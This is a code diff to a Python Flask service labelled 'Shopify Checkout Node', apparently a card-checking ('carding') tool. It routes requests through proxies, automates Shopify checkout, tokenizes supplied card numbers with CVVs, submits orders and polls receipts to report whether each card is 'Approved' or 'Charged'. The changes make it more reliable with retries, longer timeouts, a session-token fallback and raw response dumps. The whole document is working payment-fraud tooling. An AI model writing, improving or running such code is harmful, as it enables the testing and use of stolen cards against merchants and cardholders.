@@ -1,5 +1,6 @@
 """
 app.py — Shopify Checkout Node (Render / scale plan)
+FIXED: NO_RECEIPT bug + full PollForReceipt raw response returned
 """
 import os
 import re
@@ -44,13 +45,13 @@ def _load_products():
                         price_val = float(m.group(2))
                     except ValueError:
                         price_val = 0.0
-                    
+
                     if price_val < 1.00:
                         continue
 
                     _PRODUCTS_LIST.append({
-                        "vid": m.group(1), 
-                        "price": str(m.group(2)), 
+                        "vid": m.group(1),
+                        "price": str(m.group(2)),
                         "shop": m.group(3).strip().rstrip('/')
                     })
         if _PRODUCTS_LIST:
@@ -178,7 +179,9 @@ def _queue_token(b):
     m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', b); return m.group(1) if m else ""
 
 def _receipt_id(b):
-    m = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', b); return m.group(1) if m else ""
+    # matches ProcessingReceipt, ProcessedReceipt, FailedReceipt, ActionRequiredReceipt
+    m = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', b)
+    return m.group(1) if m else ""
 
 def _receipt_session(b):
     m = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', b); return m.group(1) if m else ""
@@ -195,10 +198,10 @@ def _tax_amount(b):
         d = json.loads(b)
         sp = (d.get("data",{}).get("session",{}).get("negotiate",{})
                .get("result",{}).get("sellerProposal",{}))
-        
+
         v2 = sp.get("tax",{}).get("totalTaxAmountV2",{}).get("amount")
         if v2: return v2
-        
+
         return sp.get("tax",{}).get("totalTaxAmount",{}).get("value",{}).get("amount","0.0")
     except Exception: return "0.0"
 
@@ -346,7 +349,7 @@ def _graphql_ids(session, shop_url, checkout_html, ua, t_rem):
         s = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js)
         q = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"', js)
         res = (p.group(1) if p else None, s.group(1) if s else None, q.group(1) if q else None)
-        
+
         if res[0] and res[1]:
             with _GRAPHQL_LOCK:
                 _GRAPHQL_CACHE[shop_url] = res
@@ -510,7 +513,7 @@ def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, ident_sig="", 
     return None
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 📤 RESPONSE
+# 📤 RESPONSE HELPERS
 # ─────────────────────────────────────────────────────────────────────────────
 def _resp(response, *, charged=False, approved=False, price="0 USD", elapsed_ms=None):
     d = {"Response": response, "Gate": "Shopify Payments",
@@ -518,6 +521,41 @@ def _resp(response, *, charged=False, approved=False, price="0 USD", elapsed_ms=
          "Approved": "True" if approved else "False",
          "Price": price, "success": charged or approved}
     if elapsed_ms is not None: d["Time"] = str(int(elapsed_ms))
+    return jsonify(d)
+
+def _resp_poll(raw_body, *, price="0 USD", poll_attempt=0, http_status=None,
+               status="POLLFORRECEIPT", success=False, approved=False, charged=False,
+               elapsed_ms=None):
+    """Return the FULL raw PollForReceipt response body — this is the debug payload."""
+    d = {
+        "Response": status,
+        "Gate": "Shopify Payments",
+        "Charged": "True" if charged else "False",
+        "Approved": "True" if approved else "False",
+        "Price": price,
+        "success": success,
+        "PollAttempt": poll_attempt,
+    }
+    if http_status is not None:
+        d["PollHttpStatus"] = http_status
+    if elapsed_ms is not None:
+        d["Time"] = str(int(elapsed_ms))
+    d["FullPollResponse"] = raw_body
+    return jsonify(d)
+
+def _resp_submit(raw_body, *, price="0 USD", status="SUBMIT_REJECTED", elapsed_ms=None):
+    """Return the FULL raw SubmitForCompletion response (for rejected / failed cases)."""
+    d = {
+        "Response": status,
+        "Gate": "Shopify Payments",
+        "Charged": "False",
+        "Approved": "False",
+        "Price": price,
+        "success": False,
+        "FullSubmitResponse": raw_body,
+    }
+    if elapsed_ms is not None:
+        d["Time"] = str(int(elapsed_ms))
     return jsonify(d)
 
 def _classify_failed(code):
@@ -561,17 +599,23 @@ def _run_check(card_str, proxy_str):
     if proxy_url: session.proxies = {"http": proxy_url, "https": proxy_url}
 
     try:
-        # Step 1: Cart
-        try:
-            cart_url = f"{shop_url}/cart/{vid}:1"
-            log(f"  Step 1: Cart Request -> {cart_url}")
-            r = session.get(cart_url, headers={"user-agent": ua}, allow_redirects=True, timeout=t_max(4))
-            log(f"  Step 1: Cart Status -> {r.status_code}")
-        except Exception as e:
-            log(f"  Step 1: Cart EXC -> {str(e)[:100]}")
-            return _resp("CART_FAILED", price=f"{price} USD")
-        
-        if r.status_code != 200:
+        # ── Step 1: Cart (with retry on timeout) ────────────────────────────
+        cart_url = f"{shop_url}/cart/{vid}:1"
+        r = None
+        for cart_attempt in range(2):
+            try:
+                log(f"  Step 1: Cart Request (attempt {cart_attempt+1}) -> {cart_url}")
+                r = session.get(cart_url, headers={"user-agent": ua},
+                                allow_redirects=True, timeout=t_max(10))
+                log(f"  Step 1: Cart Status -> {r.status_code}")
+                if r.status_code == 200:
+                    break
+            except Exception as e:
+                log(f"  Step 1: Cart EXC (attempt {cart_attempt+1}) -> {str(e)[:100]}")
+                if cart_attempt == 1:
+                    return _resp("CART_FAILED", price=f"{price} USD")
+
+        if not r or r.status_code != 200:
             return _resp("CART_FAILED", price=f"{price} USD")
 
         checkout_url  = r.url
@@ -588,7 +632,7 @@ def _run_check(card_str, proxy_str):
         if not commit_sha:    return _fail("NO_COMMIT_SHA",     shop=shop_url)
         if not stable_id:     return _fail("NO_STABLE_ID",      shop=shop_url)
 
-        prop_id, submit_id, poll_id = _graphql_ids(session, shop_url, checkout_html, ua, t_rem=t_max(4))
+        prop_id, submit_id, poll_id = _graphql_ids(session, shop_url, checkout_html, ua, t_rem=t_max(6))
         prop_id   = prop_id   or "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8"
         submit_id = submit_id or "b3fd8db496438a6859c96db264b77e84b3f093d11a44c4d0a84d43e661f12419"
         poll_id   = poll_id   or "b99547c8e17e88f985ec0e11a844dd1305bf14cf70e41ca10954899050ffc567"
@@ -621,49 +665,49 @@ def _run_check(card_str, proxy_str):
             "x-checkout-web-source-id":     cart_token,
         }
         prop_url = f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal"
-        
+
         use_lines = False
 
-        # Step 2: Proposal 1
+        # ── Step 2: Proposal 1 (empty) ──────────────────────────────────────
         try:
             log("  Step 2: Proposal 1 (Empty)")
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines, target_any=True)
-            r1 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
-            
+            r1 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(6))
+
             if r1.status_code == 200 and "INVALID_VARIABLE" in r1.text:
                 if "merchandiseLines" in r1.text and "not defined" in r1.text:
                     log("  Step 2: Swapping to 'lines' schema")
                     use_lines = True
                     p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines, target_any=True)
-                    r1 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
-                    
+                    r1 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(6))
+
         except Exception as e:
             log(f"  Step 2: Proposal 1 EXC -> {str(e)[:100]}")
             return _fail("P1_EXC", shop=shop_url, err=str(e)[:100])
-        
+
         log(f"  Step 2: Proposal 1 Status -> {r1.status_code}")
         if r1.status_code != 200:
             return _fail("P1_HTTP", shop=shop_url, status=r1.status_code, body=r1.text[:800])
-        
+
         queue_token = _queue_token(r1.text) or None
         if not queue_token:
             return _fail("P1_NO_QUEUE", shop=shop_url, body=r1.text[:800])
 
-        # Step 3: Proposal 2
+        # ── Step 3: Proposal 2 (email) ──────────────────────────────────────
         try:
             log("  Step 3: Proposal 2 (Email)")
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, None, prop_id, use_lines, target_any=True)
             p["variables"]["queueToken"] = queue_token
-            r2 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
+            r2 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(6))
         except Exception as e:
             log(f"  Step 3: Proposal 2 EXC -> {str(e)[:100]}")
             return _fail("P2_EXC", shop=shop_url, err=str(e)[:100])
-        
+
         log(f"  Step 3: Proposal 2 Status -> {r2.status_code}")
         if r2.status_code != 200:
             return _fail("P2_HTTP", shop=shop_url, status=r2.status_code, body=r2.text[:800])
 
-        # Step 4: Proposal 3
+        # ── Step 4: Proposal 3 (address / target item) ──────────────────────
         pm_id = ""
         del_h = ""
         signed = []
@@ -676,17 +720,17 @@ def _run_check(card_str, proxy_str):
             log("  Step 4: Proposal 3 (Address / Target Item)")
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id, use_lines, target_any=False)
             p["variables"]["queueToken"] = queue_token
-            r3 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
-            
+            r3 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(6))
+
             if r3.status_code == 200:
                 r3_text = r3.text
                 shipping_required = _is_shipping_required(r3_text)
                 log(f"  Step 4: isShippingRequired -> {shipping_required}")
-                
+
                 if "SHIPPING_ADDRESS_UNDELIVERABLE" in r3_text or "no_delivery_options" in r3_text:
                     log("  Step 4: SKIP_PHYSICAL triggered by address undeliverable")
                     return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}")
-                
+
                 pm_id  = _payment_method_id(r3_text) or _payment_method_id(r2.text) or _payment_method_id(r1.text)
                 del_h  = _delivery_handle(r3_text)
                 signed = _signed_handles(r3_text)
@@ -695,10 +739,10 @@ def _run_check(card_str, proxy_str):
                 queue_token = _queue_token(r3_text) or queue_token
             else:
                 log(f"  Step 4: Proposal 3 HTTP -> {r3.status_code}")
-                return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}") 
+                return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}")
         except Exception as e:
             log(f"  Step 4: Proposal 3 EXC -> {str(e)[:100]}")
-            return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}") 
+            return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}")
 
         if not pm_id:
             log("  Step 4: Payment ID Missing. Trying HTML fallback.")
@@ -710,20 +754,20 @@ def _run_check(card_str, proxy_str):
         if shipping_required:
             return _resp("SKIP_PHYSICAL", price=f"{amount_f} {currency}")
 
-        # Step 5: PCI
+        # ── Step 5: PCI tokenize ────────────────────────────────────────────
         ident_sig = _ident_sig(checkout_html)
         v_url     = _vault_url(checkout_html)
         v_dom     = _vault_domain(checkout_html)
 
         log("  Step 5: Tokenizing Card")
         sid = _tokenize(session, ccn, mm, yyyy, cvv, f"{fn} {ln}", shop_url.split("//")[1], ua,
-                        ident_sig=ident_sig, vault_url=v_url, vault_domain=v_dom, proxy_url=proxy_url, t_rem=t_max(4))
-        
-        if not sid: 
+                        ident_sig=ident_sig, vault_url=v_url, vault_domain=v_dom, proxy_url=proxy_url, t_rem=t_max(6))
+
+        if not sid:
             return _resp("PCI_FAILED", price=f"{amount_f} {currency}")
         log("  Step 5: PCI Token Success")
 
-        # Step 6: Submit
+        # ── Step 6: SubmitForCompletion ─────────────────────────────────────
         sa        = _street_addr(fn, ln, addr_raw)
         price_str = f"{amount_f} {currency}"
         merch_key = "lines" if use_lines else "merchandiseLines"
@@ -838,14 +882,14 @@ def _run_check(card_str, proxy_str):
         body    = ""
         cur_tax = tax or "0.0"
         cur_tot = amount_f
-        
+
         log("  Step 6: Submitting Order")
-        for tax_attempt in range(2):
+        for tax_attempt in range(3):
             try:
                 r_submit = session.post(
                     f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
                     json=_build_submit(cur_tax, cur_tot), headers=hdr,
-                    timeout=t_max(5),
+                    timeout=t_max(10),
                 )
                 body = r_submit.text
             except Exception as e:
@@ -863,54 +907,33 @@ def _run_check(card_str, proxy_str):
             break
 
         elapsed_ms = (time.monotonic() - t_start) * 1000
-        log(f"  Step 6: Submit Response -> {body[:300]}")
+        log(f"  Step 6: Submit Response -> {body[:400]}")
 
-        # ═══════════════════════════════════════════════════════════════
-        # Step 7: PollForReceipt — FINAL STATUS
-        # ═══════════════════════════════════════════════════════════════
+        # ═════════════════════════════════════════════════════════════════════
+        # Step 7: PollForReceipt — return FULL raw response
+        # ═════════════════════════════════════════════════════════════════════
         rid = _receipt_id(body)
-        rss = _receipt_session(body)
+        rss = _receipt_session(body) or session_token   # ← FIX: fallback to checkout session_token
 
-        if not rid or not rss:
-            # No receipt — likely SubmitRejected or SubmitFailed
-            try:
-                resp_json = json.loads(body)
-                submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
-                result_type = submit_data.get('__typename', '')
-                
-                if result_type == 'SubmitRejected':
-                    errors = submit_data.get('errors', [])
-                    if errors:
-                        for error in errors:
-                            code = error.get('code', '')
-                            localized_msg = error.get('localizedMessage', '')
-                            non_localized_msg = error.get('nonLocalizedMessage', '')
-                            if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', ''):
-                                detail = localized_msg or non_localized_msg
-                                if detail:
-                                    return _resp(detail, price=price_str)
-                            if code:
-                                resp, apv, chg = _classify_failed(code)
-                                return _resp(resp, approved=apv, charged=chg, price=price_str)
-                    return _resp("Submit Rejected", price=price_str)
-                
-                if result_type == 'SubmitFailed':
-                    reason = submit_data.get('reason', 'Unknown reason')
-                    return _resp("CARD_DECLINED", price=price_str)
-            except Exception:
-                pass
-            return _fail("NO_RECEIPT", shop=shop_url, body=body[:800], price=price_str)
+        if not rid:
+            # No receipt at all — SubmitRejected / SubmitFailed / schema error
+            log(f"  Step 7: No receipt id in submit body. Returning full submit response.")
+            return _resp_submit(body, price=price_str, status="NO_RECEIPT",
+                                elapsed_ms=(time.monotonic() - t_start) * 1000)
 
-        log(f"  Step 7: Polling receipt {rid[:40]}...")
+        log(f"  Step 7: Polling receipt {rid[:50]}...")
         poll_headers = hdr.copy()
         poll_headers["accept-language"] = "en-US"
 
+        all_poll_bodies = []
         last_pb = ""
+        last_http = None
+
         for poll_attempt in range(1, 11):
             if remain() < 4:
                 log(f"  Step 7: Budget exhausted at poll {poll_attempt}")
                 break
-            time.sleep(3)
+            time.sleep(2)   # pollDelay is 500ms; 2s is safe
 
             poll_data = {
                 "variables": {"receiptId": rid, "sessionToken": rss},
@@ -927,66 +950,64 @@ def _run_check(card_str, proxy_str):
                 )
                 pb = r_p.text
                 last_pb = pb
-                log(f"    Poll {poll_attempt}/{10}: Status {r_p.status_code} | FULL RESPONSE:")
+                last_http = r_p.status_code
+                all_poll_bodies.append({"attempt": poll_attempt, "http": r_p.status_code, "body": pb})
+                log(f"    Poll {poll_attempt}/10: HTTP {r_p.status_code} | FULL RESPONSE:")
                 log(f"    {pb}")
 
-                parsed = False
-                try:
-                    poll_json = json.loads(pb)
-                    if "data" not in poll_json or "receipt" not in poll_json["data"]:
-                        log(f"    Poll {poll_attempt}: no data.receipt, continuing")
-                        continue
-                    
-                    receipt = poll_json["data"]["receipt"]
-                    ptype = receipt.get("__typename", "")
-                    log(f"    Poll {poll_attempt}: __typename = {ptype}")
+                # Detect terminal state
+                compact = pb.replace(" ", "")
+                if '"__typename":"ProcessedReceipt"' in compact:
+                    log("  Step 7: ✅ ORDER PLACED")
+                    return _resp_poll(
+                        pb, price=price_str, poll_attempt=poll_attempt,
+                        http_status=r_p.status_code,
+                        status="ORDER_PLACED", success=True, approved=True, charged=True,
+                        elapsed_ms=(time.monotonic() - t_start) * 1000,
+                    )
+                if '"__typename":"FailedReceipt"' in compact:
+                    code = _code(pb) or "CARD_DECLINED"
+                    status, apv, chg = _classify_failed(code)
+                    log(f"  Step 7: ❌ FAILED -> {status}")
+                    return _resp_poll(
+                        pb, price=price_str, poll_attempt=poll_attempt,
+                        http_status=r_p.status_code,
+                        status=status, success=False, approved=apv, charged=chg,
+                        elapsed_ms=(time.monotonic() - t_start) * 1000,
+                    )
+                if '"__typename":"ActionRequiredReceipt"' in compact:
+                    log("  Step 7: 🔔 3DS REQUIRED")
+                    return _resp_poll(
+                        pb, price=price_str, poll_attempt=poll_attempt,
+                        http_status=r_p.status_code,
+                        status="3DS_AUTHENTICATION_REQUIRED", success=False, approved=True,
+                        elapsed_ms=(time.monotonic() - t_start) * 1000,
+                    )
 
-                    if ptype == "ProcessedReceipt":
-                        log(f"  Step 7: ✅ SUCCESS -> ORDER PLACED")
-                        ms = (time.monotonic() - t_start) * 1000
-                        return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=ms)
-
-                    elif ptype == "FailedReceipt":
-                        err = receipt.get("processingError", {})
-                        code = err.get("code", "UNKNOWN")
-                        msg = err.get("messageUntranslated", "")
-                        log(f"  Step 7: ❌ FAILED -> {code} ({msg})")
-                        resp, apv, chg = _classify_failed(code)
-                        ms = (time.monotonic() - t_start) * 1000
-                        return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=ms)
-
-                    elif ptype == "ActionRequiredReceipt":
-                        log(f"  Step 7: 🔔 3DS REQUIRED")
-                        ms = (time.monotonic() - t_start) * 1000
-                        return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=ms)
-
-                    else:
-                        log(f"    Poll {poll_attempt}: still processing ({ptype}), continuing...")
-                        parsed = True
-                        continue
-
-                except json.JSONDecodeError:
-                    log(f"    Poll {poll_attempt}: JSON parse failed")
-
-                if not parsed:
-                    # Fallback — safer substring checks (JSON-specific)
-                    if '"__typename":"ProcessedReceipt"' in pb.replace(" ", ""):
-                        log(f"  Step 7: ✅ SUCCESS (substring match)")
-                        ms = (time.monotonic() - t_start) * 1000
-                        return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=ms)
-                    if '"__typename":"FailedReceipt"' in pb.replace(" ", ""):
-                        code = _code(pb) or "CARD_DECLINED"
-                        log(f"  Step 7: ❌ FAILED (substring match) -> {code}")
-                        resp, apv, chg = _classify_failed(code)
-                        ms = (time.monotonic() - t_start) * 1000
-                        return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=ms)
+                # still ProcessingReceipt — keep polling
+                log(f"    Poll {poll_attempt}: still processing, continuing...")
 
             except Exception as e:
-                log(f"    Poll {poll_attempt}: EXC -> {str(e)[:100]}")
+                log(f"    Poll {poll_attempt}: EXC -> {str(e)[:120]}")
                 continue
 
-        log(f"  Step 7: Polling exhausted. Last: {last_pb[:200]}")
-        return _resp("ORDER_PLACED", charged=True, price=price_str)
+        # Polling exhausted — return the last raw response (or all collected)
+        log(f"  Step 7: Polling exhausted after {len(all_poll_bodies)} attempts")
+        d = {
+            "Response": "POLL_EXHAUSTED",
+            "Gate": "Shopify Payments",
+            "Charged": "False",
+            "Approved": "False",
+            "Price": price_str,
+            "success": False,
+            "PollAttempt": len(all_poll_bodies),
+            "FullPollResponse": last_pb,
+            "AllPollResponses": all_poll_bodies,
+            "Time": str(int((time.monotonic() - t_start) * 1000)),
+        }
+        if last_http is not None:
+            d["PollHttpStatus"] = last_http
+        return jsonify(d)
 
     except Exception as e:
         log(f"❌ TOP EXC: {str(e)[:150]}")
